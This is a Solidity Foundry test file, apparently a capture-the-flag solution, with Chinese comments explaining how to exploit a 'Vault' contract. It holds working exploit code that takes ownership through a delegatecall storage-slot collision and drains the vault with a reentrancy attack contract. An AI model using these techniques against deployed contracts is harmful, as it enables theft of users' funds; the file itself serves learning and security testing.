// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Vault.sol";

//重入攻击合约
contract Attack {
    Vault public vault;
    uint256 public attackAmount;

    constructor(address payable _vault) {
        vault = Vault(_vault);
    }

    function startAttack() public payable{
        attackAmount = msg.value;
        vault.deposite{value: attackAmount}();
        vault.withdraw();
    }

    receive() external payable {
        if (address(vault).balance > 0 && address(vault).balance < attackAmount) {
            vault.withdraw();
        }
    }
}



contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;

    address owner = address (1);
    address palyer = address (2);

    function setUp() public {
        vm.deal(owner, 100 ether);
        vm.startPrank(owner);
        logic = new VaultLogic(bytes32("0x1234"));
        vault = new Vault(address(logic));
        vault.deposite{value: 100 ether}();
        vm.stopPrank();

    }

    function testExploit() public {
        vm.deal(palyer, 500 ether);
        vm.startPrank(palyer);

        // 插槽攻击
        // 编码changeOwner 
        //1、密码传入VaultLogic的合约地址 
        //2、Vault合约执行时使用的delegatecall 会把VaultLogic的代码部署到Vault的代码空间 
        //3、在执行changeOwner时 password 会指向 VaultLogic的合约地址
        //4、我们传入的密码为 VaultLogic的合约地址 判定条件会成立
        //5、修改owner为攻击者地址
        bytes memory data = abi.encodeWithSelector(VaultLogic.changeOwner.selector, address(logic), palyer);

        //调用changeOwner
        (bool success, ) = address(vault).call(data);
        require(success, "call failed");
        //验证owner是否被修改
        assertEq(address(vault.owner()), palyer, "owner not changed");

        //重入攻击
        Attack attack = new Attack(payable(address(vault)));
        // 打开提款
        vault.openWithdraw();
        
        // 开始攻击
        attack.startAttack{ value: 10 ether }();

        // 验证攻击是否成功
        assertEq(address(attack).balance, 110 ether, "balance not changed");
     
        vm.stopPrank();
    }

}
